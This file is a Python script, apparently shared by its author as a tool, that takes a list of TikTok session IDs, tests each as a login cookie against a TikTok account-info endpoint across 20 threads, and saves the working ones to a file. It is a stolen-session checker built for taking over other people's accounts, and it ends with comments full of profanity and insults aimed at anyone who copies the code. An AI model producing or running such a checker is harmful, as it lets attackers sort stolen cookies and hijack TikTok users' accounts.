import requests as Alibaba
import os as Bendurmam
import concurrent.futures as Benakillanmam
from threading import Lock as sorybaby

sorypaket = sorybaby()
Sorybanned = "https://api16-normal-c-alisg.tiktokv.com/passport/web/account/info/"

S = "\033[92m"
O = "\033[91m"
R = "\033[93m"
Y = "\033[0m"
print(f'{O}dev: @SoryCoder ~ @soryxtool{Y}')
Soryxtool = input(f"{R}combo: {Y}").strip()

if not Bendurmam.path.exists(Soryxtool):
    exit(f"{O}file not found{Y}")

with open(Soryxtool, "r", encoding="utf-8") as SoryCoder:
    Sorytool = [editciyimabi.strip() for editciyimabi in SoryCoder if editciyimabi.strip()]

sory_hit = 0
sory_bad = 0
sory_ban = 0

def Sorypro(Sorybaboli):
    global sory_hit, sory_bad, sory_ban
    sory_res = "bad"
    
    try:
        sory_req = Alibaba.get(Sorybanned, headers={"Cookie": f"sessionid={Sorybaboli}"}, timeout=10)
        if "sec_user_id" in sory_req.text:
            sory_res = "hit"
        elif sory_req.status_code in (429, 403):
            sory_res = "ipban"
    except Exception:
        pass

    with sorypaket:
        if sory_res == "hit":
            sory_hit += 1
            with open("sory.txt", "a", encoding="utf-8") as kahpeyim:
                kahpeyim.write(f"{Sorybaboli}\n")
        elif sory_res == "ipban":
            sory_ban += 1
        else:
            sory_bad += 1
            
        print(
            f"\r{S}Hit: {sory_hit}{Y} | {O}Bad: {sory_bad}{Y} | {R}IP Ban: {sory_ban}{Y}",
            end="", flush=True
        )

print(f"{R}total checking {len(Soryxtool)} session{Y}\n")

with Benakillanmam.ThreadPoolExecutor(max_workers=20) as Benhackerim:
    list(Benhackerim.map(Sorypro, Sorytool))

print(f"\n\n{S}Dev: @SoryCoder{Y}")


#Editleme Orospucocu...
#dont copy past my code son of a bitchhh
#ibn sermuta uahahahhahahha 

#SoryCoder ~ @SoryxTool